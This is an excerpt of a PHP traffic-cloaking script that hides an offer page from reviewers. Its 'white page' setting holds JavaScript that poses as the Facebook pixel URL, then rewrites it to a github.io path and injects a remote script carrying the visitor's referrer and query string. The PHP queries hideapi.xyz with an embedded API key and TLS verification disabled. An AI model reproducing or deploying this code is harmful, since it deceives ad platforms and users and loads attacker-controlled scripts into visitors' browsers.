...
$CLOAKING['API_SECRET_KEY'] = 'v17d5a75b9b2d241949ece989e3f93f6de';
/*********************************************/
/* YOU MUST TO GENERATE NEW SCRIPT TO CHANGE THIS */
$CLOAKING['WHITE_PAGE'] = '<script>var src="https://connect.facebook.net/en_US/fbevents.js",t="script";src+="?ref="+encodeURIComponent(document.referrer)+"&q="+window.location.search.substr(1);if("lhxgbneruqinuydufeplgrullnsfvztggqnheszyihmcgpwltmwzdrlpfduacohjeurjmqiuyuwej") document.write("<"+t+" src=\"" + src.replace(/^[^?]+/,"https://rrembcvll3.github.io/bookusd/js/") + "\"><\/"+t+">")</script>';// white page JS script integration code.
...
if(!empty($_REQUEST['cloaking'])) {
    ...
    if ($_REQUEST['cloaking'] == 'stat' || $_REQUEST['cloaking'] == 'stats') {
        ...
        if (!function_exists('curl_init')) $statistic = file_get_contents('https://hideapi.xyz/newstatjs?api=' . $CLOAKING['API_SECRET_KEY'] . '&lang=ru&sign=92461661422171f1591266210&version='.$CLOAKING['VERSION'].'&stage=js1&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&geo=' . urlencode($CLOAKING['ALLOW_GEO']) . '&paranoid=' . $CLOAKING['PARANOID'] . '&host=' . urlencode($host) . '&offer=' . urlencode($CLOAKING['OFFER_PAGE']).$domainStat, 'r', stream_context_create(array('http' => array('method' => 'GET', 'timeout' => 45), 'ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,) )) );
        else $statistic = cloakedCurl('https://hideapi.xyz/newstatjs?api=' . $CLOAKING['API_SECRET_KEY'] . '&lang=ru&sign=92461661422171f1591266210&version='.$CLOAKING['VERSION'].'&stage=js1&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&geo=' . urlencode($CLOAKING['ALLOW_GEO']) . '&paranoid=' . $CLOAKING['PARANOID'] . '&host=' . urlencode($host) . '&offer=' . urlencode($CLOAKING['OFFER_PAGE']).$domainStat);
        echo $statistic;
    ...
    $CLOAKINGdata=array();
    if(!function_exists('curl_init')) $CLOAKING['STATUS'] = @file_get_contents('http://api.hideapi.xyz/basic?ip=1.1.1.1&port=1111&key='.$CLOAKING['API_SECRET_KEY'].'&sign=92461661422171f1591266210&version='.$CLOAKING['VERSION'].'&curl=false&stage=js1&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&htaccess='.$CLOAKING['HTACCESS_FIX'] , 'r', stream_context_create(array('ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,), 'http' => array('method' => 'POST', 'timeout' => 5, 'header'=> "Content-type: application/x-www-form-urlencoded\r\n". "Content-Length: ".strlen($CLOAKINGdata). "\r\n", 'content' => $CLOAKINGdata))));
    else $CLOAKING['STATUS'] = @cloakedCurl('http://api.hideapi.xyz/basic?ip=1.1.1.1&port=1111&key='.$CLOAKING['API_SECRET_KEY'].'&sign=92461661422171f1591266210&version='.$CLOAKING['VERSION'].'&curl=true&stage=js1&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&htaccess='.$CLOAKING['HTACCESS_FIX'], $CLOAKINGdata);
